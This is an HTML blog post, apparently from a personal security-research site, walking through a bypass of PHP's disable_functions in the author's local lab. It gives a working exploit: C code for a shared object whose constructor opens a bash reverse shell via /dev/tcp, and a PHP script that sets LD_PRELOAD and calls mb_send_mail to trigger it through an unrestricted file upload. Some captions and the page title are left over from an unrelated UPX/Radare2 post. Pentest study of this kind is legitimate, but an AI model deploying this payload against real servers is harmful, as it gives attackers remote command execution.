@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UnpackMe Writeup | xenon </title>
+    <link rel="icon" type="image/png" sizes="16x16" href="assets/favicon.jpg" crossorigin="anonymous">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <nav>
+        <div class="container nav-flex">
+            <div class="logo">XENON</div>
+            <ul class="nav-links">
+                <li><a href="index.html">Home</a></li>
+                <li><a href="blog.html">Blog</a></li>
+                <li><a href="contact.html">Contact</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <article class="container" style="padding: 60px 0;">
+        <header style="margin-bottom: 40px;">
+            <h1 style="color: var(--accent); font-size: 2.5rem;">Bypass PHP Disabled Function</h1>
+            <p style="color: var(--dim-text);">Web Exploitation | January 2026</p>
+        </header>
+
+        <section class="post-content">
+           
+            <h2 class="section-label" style="margin-top: 40px;">The Idea</h2>
+            <p>This blog post walks through how to bypass one of the most common PHP security measures: the disable_functions which is used by most php application/web servers</p>
+            
+            <p>Im order to show the exploit. I have created this php application based on my pentest project. It runs inside my local docker. It is the exact same backend for the file upload logic and php directive</p>
+           
+
+            <!-- <p>You can learn more about the technical details at the official site: <a href="https://upx.github.io/" style="color: var(--accent);">upx.github.io</a></p> -->
+
+                <div class="image-placeholder">
+                <img src="assets/images/exp_app.png" alt="Decompressing binary with UPX">
+                <p class="caption">The application</p>
+            </div>
+
+            <h2 class="section-label">Prequesties</h2>
+            <b><p>The PHP application should be vulnerable for unrestricted file upload, permitting any file type to be uploaded on the server.</p></b>
+
+            <h2 class="section-label">The file upload form</h2>
+            <p>Lets upload the php files. which executes the command <code>id</code> on the host machine/server</p>
+
+            <div class="image-placeholder">
+                <img src="assets/images/dis.png" alt="ID upload">
+                
+            </div>
+
+            <p>At this point we know system function is disabled, we can check this using <code> &lt;?php phpinfo(); ?&gt;</code></p>
+
+            <div class="image-placeholder">
+                <img src="assets/images/phpinfo.png" alt="Radare2 disassembly output">
+                <p class="caption">Analyzing the main function in Radare2</p>
+            </div>
+            <h2 class="section-label">Scenario</h2>
+            <ul>
+                <li>The vulnerability starts with a standard, file upload feature on the website. We already know that.</li>
+                <li>Since We can upload anything, Lets write a small C program. and use a constructor instead of a standard "main" function. This ensures that the code executes the very time the library is touched by the OS</li>
+                <li>Create a final php file which triggers the exploit</li>
+            </ul>
+            <h2 class="section-label">mb_send_mail aka The executor</h2>
+            <p>(PHP 4 >= 4.0.6, PHP 5, PHP 7, PHP 8)
+            mb_send_mail — Send encoded mail</p>
+
+            <p>You can find the Docs <a href="https://www.php.net/manual/en/function.mb-send-mail.php" style="color: var(--accent);">Here</a></p>
+            <p>mb_send_mail is a PHP function used to send emails with multi-byte encoding. It takes 4 argument</p>
+
+
+            <pre class="terminal-body" style="background: #000; color: #fff;">mb_send_mail(
+    string $to,
+    string $subject,
+    string $message,
+    array|string $additional_headers = [],
+    ?string $additional_params = null
+): bool</pre>
+           <p></p>
+
+            <h2 class="section-label">The Exploit</h2>
+            <p>Create a small C program and then later compile it to a shared object (.so).</p>
+
+        <div style="background-color: #1e1e1e; padding: 20px; border-radius: 8px; font-family: 'Consolas', 'Monaco', monospace; line-height: 1.5; color: #d4d4d4; border: 1px solid #3c3c3c;"> <div><span style="color: #c586c0;">#define</span> <span style="color: #9cdcfe;">_GNU_SOURCE</span></div> <div><span style="color: #c586c0;">#include</span> <span style="color: #ce9178;">&lt;stdlib.h&gt;</span></div> <div><span style="color: #c586c0;">#include</span> <span style="color: #ce9178;">&lt;unistd.h&gt;</span></div>
+
+
+        <div><span style="color: #569cd6;">attribute</span> ((<span style="color: #dcdcaa;">constructor</span>)) <span style="color: #569cd6;">void</span> <span style="color: #dcdcaa;">exploit_init</span>(<span style="color: #569cd6;">void</span>) {</div> <div style="padding-left: 20px;"><span style="color: #dcdcaa;">unsetenv</span>(<span style="color: #ce9178;">"LD_PRELOAD"</span>);</div> <div style="padding-left: 20px;"><span style="color: #dcdcaa;">system</span>(<span style="color: #ce9178;">"bash -c 'bash -i >& /dev/tcp/172.17.0.1/7666 0>&1'"</span>);</div> <div>}</div> </div>
+            <p></p>
+            <p>Change the IP and Port.</p>
+
+
+            <pre class="terminal-body" style="background: #000; color: #fff;">xen.c  xen.so</pre>
+           <p>So Here is the exploit logic, The moment we call mb_send_mail is called. the OS prepares to run <code>sendmail</code>. It sees the LD_PRELOAD instruction, loads the attacker's library, and executes the reverse shell code.</p>
+           <p>When PHP calls mb_send_mail(), it doesn't send the email itself. Instead, it "forks" a new process to run the system's mail binary (usually sendmail).</p>
+
+           
+
+           <pre class="terminal-body" style="background: #000; color: #fff;">sendmail_path => /usr/sbin/sendmail -t -i => /usr/sbin/sendmail -t -i</pre>
+           <p>Here is the final exploit script.</p>
+
+       <div style="background-color: #1e1e1e; padding: 20px; border-radius: 8px; font-family: 'Consolas', 'Monaco', monospace; line-height: 1.5; color: #d4d4d4; border: 1px solid #3c3c3c;"> <div><span style="color: #569cd6;">&lt;?php</span></div> <div style="color: #6a9955; padding-left: 20px;"></div> <div style="padding-left: 20px;"><span style="color: #dcdcaa;">putenv</span>(<span style="color: #ce9178;">"LD_PRELOAD=/var/www/html/uploads/xen.so"</span>);</div>
+
+
+<div style="color: #6a9955; padding-left: 20px;"></div> <div style="padding-left: 20px;"><span style="color: #dcdcaa;">mb_send_mail</span>(<span style="color: #ce9178;">"xen@localhost"</span>, <span style="color: #ce9178;">"xen"</span>, <span style="color: #ce9178;">"xen"</span>, <span style="color: #ce9178;">"xen"</span>);</div>
+
+
+<div style="padding-left: 20px;"><span style="color: #569cd6;">echo</span> <span style="color: #ce9178;">"Exploit triggered."</span>;</div> <div><span style="color: #569cd6;">?&gt;</span></div> </div>
+           
+<p></p>                
+<p>Upload the final exploit using the web file upload form. and go to <code>/uploads/exploit.php</code></p>
+
+            <div class="image-placeholder">
+                <img src="assets/images/exptr.png" alt="Exploit triggered">
+            
+            </div>
+
+            <div class="image-placeholder">
+                <img src="assets/images/exprv.png" alt="Exploit done">
+                
+            </div>
+            <h2 class="section-label" style="margin-top: 40px;">Conclusion</h2>
+            <p>This blog shows that disabling a certain function is not enough while the OS remains open and the application can talk the OS through env variables. This exploit proves that.</p>
+        
+        
+        </section>
+
+        <div style="margin-top: 60px;">
+            <a href="blog.html" class="btn-block" style="text-decoration: none; display: inline-block; width: auto; padding: 10px 30px;">&larr; Return to Archive</a>
+        </div>
+    </article>
+
+    <footer>
+       <p>&copy; 2026. Security Research Archive.</p>
+    </footer>
+</body>
+</html>
